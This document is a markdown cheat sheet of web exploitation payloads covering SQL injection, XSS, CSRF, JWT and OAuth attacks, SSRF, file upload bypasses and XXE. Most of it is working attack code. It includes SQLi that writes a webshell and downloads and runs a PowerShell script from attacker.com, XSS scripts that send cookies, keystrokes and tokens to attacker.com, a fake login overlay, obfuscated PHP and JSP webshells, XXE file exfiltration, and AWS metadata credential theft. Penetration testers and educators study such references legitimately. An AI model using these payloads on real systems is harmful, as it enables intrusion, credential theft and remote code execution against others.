# Web Application Exploitation

> Technical deep-dive into web vulnerabilities with actual payloads and exploitation techniques.

---

## SQL Injection

### 1.1 Detection

**Basic Tests**:
```
# Error-based detection
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or #
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
OR 1=1
' OR 'x'='x
' AND id IS NULL; --
```

**Time-based detection**:
```sql
-- MySQL
' OR SLEEP(5)--
' OR SLEEP(5)#
1' AND SLEEP(5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' || pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' + WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### 1.2 Exploitation Techniques

**Union-based SQLi**:
```sql
-- Step 1: Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  # Until error

-- Step 2: Find displayable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Step 3: Extract data
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Boolean-based Blind SQLi**:
```sql
-- Determine database length
' AND LENGTH(database())=1--    # False
' AND LENGTH(database())=5--    # True

-- Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>96--
' AND ASCII(SUBSTRING(database(),1,1))=100--  # 'd'

-- Automated with SQLMap
sqlmap -u "https://target.com/page?id=1" --batch --technique=B
```

**Out-of-Band SQLi**:
```sql
-- MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--

-- MSSQL
'; exec master..xp_dirtree '//attacker.com/a'--

-- Oracle
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### 1.3 Authentication Bypass

```sql
-- Classic bypass
admin'--
admin'#
admin'/*
' OR 1=1--
' OR 1=1#
') OR ('1'='1

-- Login as specific user
' UNION SELECT 1,'admin','password_hash'--

-- If login uses MD5
' UNION SELECT 1,'admin','5d41402abc4b2a76b9719d911017c592'-- (hello)
```

### 1.4 SQLi to RCE

```sql
-- MySQL: Write webshell
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

-- MSSQL: Command execution
'; EXEC xp_cmdshell 'whoami';--

-- Enable xp_cmdshell if disabled
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")';--
```

---

## Cross-Site Scripting (XSS)

### 2.1 Detection Payloads

**Basic Tests**:
```html
<!-- Context-agnostic probes -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

<!-- Event handlers -->
<div onmouseover="alert(1)">hover me</div>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
```

**Filter Bypass**:
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Polyglots -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 2.2 Exploitation

**Session Hijacking**:
```html
<script>
fetch('https://attacker.com/steal?cookie='+document.cookie);
</script>

<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">
```

**Keylogging**:
```html
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key='+e.key);
}
</script>
```

**Phishing within XSS**:
```html
<script>
document.body.innerHTML = '<h1>Session Expired</h1><form action="https://attacker.com/phish"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
</script>
```

### 2.3 XSS to RCE

**Via Electron Apps**:
```html
<script>
require('child_process').exec('calc.exe');
</script>
```

**Via WebSocket to Internal Services**:
```html
<script>
var ws = new WebSocket('ws://localhost:8080');
ws.onopen = function() {
    ws.send('{"cmd":"exec","payload":"id"}');
};
ws.onmessage = function(e) {
    fetch('https://attacker.com/?data='+btoa(e.data));
};
</script>
```

---

## Cross-Site Request Forgery (CSRF)

### 3.1 Detection

**Check for CSRF Protection**:
```
□ Anti-CSRF token present?
□ Token validated server-side?
□ Token tied to user session?
□ SameSite cookie attribute set?
□ Referer/Origin header checked?
```

### 3.2 Exploitation

**GET-based CSRF**:
```html
<img src="https://target.com/transfer?to=attacker&amount=10000">
<iframe src="https://target.com/delete?id=1" style="display:none">
```

**POST-based CSRF**:
```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>
```

**JSON CSRF**:
```html
<html>
<body>
<script>
fetch('https://target.com/api/update', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"email":"attacker@evil.com"}'
});
</script>
</body>
</html>
```

### 3.3 Token Bypass Techniques

```markdown
1. Remove token entirely
   - Some apps only check if token exists, not if it's valid

2. Use another user's token
   - If tokens aren't user-specific

3. Use empty token
   - csrf_token=

4. Change request method
   - POST → GET (token might not be checked)

5. Token in different parameter
   - Remove from body, add to URL

6. Predictable tokens
   - timestamp-based
   - sequential numbers
```

---

## Authentication Bypass

### 4.1 JWT Attacks

**Algorithm Confusion**:
```python
# Original JWT (RS256)
# Change algorithm to none
import jwt
token = jwt.encode({"user": "admin"}, key="", algorithm="none")
# Header: {"alg": "none", "typ": "JWT"}

# Change RS256 to HS256 (use public key as secret)
public_key = open("public.pem").read()
token = jwt.encode({"user": "admin"}, public_key, algorithm="HS256")
```

**JWT Tool Commands**:
```bash
# Install
pip install jwt_tool

# Scan for vulnerabilities
python3 jwt_tool.py <JWT> -M at

# Exploit none algorithm
python3 jwt_tool.py <JWT> -X a

# Exploit key confusion
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Brute force secret
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

### 4.2 OAuth Attacks

```markdown
1. Redirect URI Manipulation
   - /callback?code=X&redirect_uri=https://attacker.com
   - Open redirect in redirect_uri

2. CSRF in OAuth Flow
   - Missing state parameter
   - Predictable state

3. Authorization Code Reuse
   - Use same code multiple times

4. Token Leakage
   - Token in URL fragment → Referer header leak
   - Token in redirect URI
```

### 4.3 Session Attacks

**Session Fixation**:
```markdown
1. Attacker gets session ID: SESSIONID=abc123
2. Send victim: https://target.com/login?SESSIONID=abc123
3. Victim logs in (session ID not regenerated)
4. Attacker uses abc123 → authenticated as victim
```

**Session Hijacking via XSS**:
```javascript
// Steal cookies
document.location='https://attacker.com/steal?c='+document.cookie;

// Steal localStorage tokens
fetch('https://attacker.com/steal?token='+localStorage.getItem('token'));
```

---

## Server-Side Request Forgery (SSRF)

### 5.1 Detection

**Test Payloads**:
```
# Localhost variations
http://127.0.0.1
http://localhost
http://127.1
http://0
http://[::1]
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:3306

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/  (AWS)
http://metadata.google.internal/           (GCP)
http://169.254.169.254/metadata/instance   (Azure)

# Internal network
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

### 5.2 Bypass Techniques

**URL Parser Bypass**:
```
# Using @ to bypass
http://attacker.com@127.0.0.1

# Using # to bypass
http://127.0.0.1#.attacker.com

# Decimal IP
http://2130706433 (127.0.0.1)

# Hex IP
http://0x7f.0x00.0x00.0x01

# Octal IP
http://0177.0.0.1

# URL encoding
http://127.0.0.1%252f
http://%31%32%37%2e%30%2e%30%2e%31

# IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]
```

### 5.3 Exploitation

**AWS Metadata to RCE**:
```bash
# Step 1: Get IAM role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Get credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Step 3: Use credentials
export AWS_ACCESS_KEY_ID=XXX
export AWS_SECRET_ACCESS_KEY=YYY
export AWS_SESSION_TOKEN=ZZZ
aws s3 ls
aws ec2 describe-instances
```

**Internal Port Scanning**:
```python
# via SSRF
for port in range(1, 10000):
    url = f"http://127.0.0.1:{port}"
    resp = requests.get(f"https://target.com/fetch?url={url}")
    if "connection refused" not in resp.text.lower():
        print(f"Port {port} is open")
```

---

## File Upload Attacks

### 6.1 Bypass Techniques

**Extension Bypass**:
```
shell.php.jpg
shell.php%00.jpg (null byte)
shell.pHp (case variation)
shell.php5
shell.phtml
shell.phar
shell.php.xxxxx
shell.php::$DATA (Windows)
```

**Content-Type Bypass**:
```
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: image/png
```

**Magic Bytes**:
```bash
# GIF header + PHP
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# PNG header + PHP
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php
```

### 6.2 Webshell Examples

**Minimal PHP Shell**:
```php
<?php system($_GET['c']); ?>
<?=`$_GET[c]`?>
<?php eval($_POST['code']); ?>
```

**Obfuscated Shell**:
```php
<?php
$a = 'sys'.'tem';
$a($_GET['c']);
?>

<?php
$_="\x73\x79\x73\x74\x65\x6d";
$_($_GET['c']);
?>
```

**JSP Shell**:
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String line;
while ((line = dis.readLine()) != null) {
    out.println(line);
}
%>
```

---

## XML External Entity (XXE)

### 7.1 Detection

**Basic XXE**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Blind XXE with OOB**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd on attacker server**:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### 7.2 Exploitation

**Read Files**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
```

**SSRF via XXE**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

**RCE (PHP expect)**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
```

---

## Quick Reference: Web Exploitation Payloads

| Vulnerability | Quick Test | Impact |
|--------------|------------|--------|
| SQLi | `' OR 1=1--` | Data breach, auth bypass |
| XSS | `<script>alert(1)</script>` | Session hijacking, phishing |
| CSRF | Form without token | Unauthorized actions |
| SSRF | `http://169.254.169.254` | Internal access, RCE |
| XXE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | File read, SSRF |
| Path Traversal | `../../../etc/passwd` | File disclosure |
| Command Injection | `; id` or `| id` | RCE |
| SSTI | `{{7*7}}` or `${7*7}` | RCE |

---

## Detection Tools

```bash
# SQLi
sqlmap -u "URL" --batch --level=5 --risk=3

# XSS
dalfox url "URL" --output result.txt

# SSRF
ssrfmap -r request.txt -p url -m portscan

# XXE
xxeinjector --host=attacker.com --file=request.xml

# All-in-one
nuclei -u "URL" -t nuclei-templates/vulnerabilities/
```
